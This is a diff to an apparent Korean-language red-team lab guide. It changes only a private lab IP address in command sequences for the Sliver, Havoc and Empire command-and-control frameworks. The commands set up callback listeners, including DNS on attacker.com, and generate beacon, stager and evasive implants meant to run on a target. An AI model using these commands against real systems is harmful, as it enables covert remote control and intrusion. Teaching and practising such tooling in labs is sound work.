@@ -843,31 +843,31 @@ sliver-server                                              # interactive
 sliver-server daemon
 
 # === 2. Multi-player (다중 client) ===
-sliver > new-operator --name alice --lhost 192.168.0.112
+sliver > new-operator --name alice --lhost 10.20.30.202
 # alice.cfg 파일 생성 → 다른 머신에서 사용 가능
 
 # === 3. Listeners (5종) ===
 
 # 3-1) mTLS (인증서 검증, 가장 안전)
-sliver > mtls --lhost 192.168.0.112 --lport 443
+sliver > mtls --lhost 10.20.30.202 --lport 443
 
 # 3-2) HTTPS
-sliver > https --lhost 192.168.0.112 --lport 443
+sliver > https --lhost 10.20.30.202 --lport 443
 
 # 3-3) HTTP
-sliver > http --lhost 192.168.0.112 --lport 80
+sliver > http --lhost 10.20.30.202 --lport 80
 
 # 3-4) DNS (가장 은닉)
 sliver > dns --domains attacker.com.,c2.attacker.com.
 
 # 3-5) Wireguard (가장 advanced — VPN-like)
-sliver > wg --lhost 192.168.0.112 --lport 51820
+sliver > wg --lhost 10.20.30.202 --lport 51820
 
 # === 4. Implant 생성 ===
 
 # Beacon (간헐적 callback — APT 표준)
 sliver > generate beacon \
-    --mtls 192.168.0.112:443 \
+    --mtls 10.20.30.202:443 \
     --os linux \
     --arch amd64 \
     --evasion \
@@ -877,7 +877,7 @@ sliver > generate beacon \
 
 # Session (지속 connection — handson testing)
 sliver > generate \
-    --mtls 192.168.0.112:443 \
+    --mtls 10.20.30.202:443 \
     --save /tmp/session
 
 # Format 옵션
@@ -887,8 +887,8 @@ sliver > generate \
 # --format service (Win service)
 
 # Multi-stage (stager + payload)
-sliver > generate stage-listener --tcp 192.168.0.112:8080
-sliver > generate --stager 192.168.0.112:8080 --save /tmp/stager
+sliver > generate stage-listener --tcp 10.20.30.202:8080
+sliver > generate --stager 10.20.30.202:8080 --save /tmp/stager
 
 # === 5. Implant 실행 (target 에서) ===
 chmod +x /tmp/beacon
@@ -999,7 +999,7 @@ cd ~/havoc
 
 # === 2. Client 연결 ===
 ./havoc client                                             # Qt GUI
-# Connect to: 192.168.0.112:40056
+# Connect to: 10.20.30.202:40056
 # Username: admin / Password: (havoc.yaotl 에서)
 
 # === 3. Listener ===
@@ -1035,7 +1035,7 @@ sudo ./ps-empire client                                    # client
 # === 2. Listener ===
 (Empire) > listeners
 (Empire) > uselistener http
-(Empire/listeners/http) > set Host http://192.168.0.112:80
+(Empire/listeners/http) > set Host http://10.20.30.202:80
 (Empire/listeners/http) > set Port 80
 (Empire/listeners/http) > execute
 
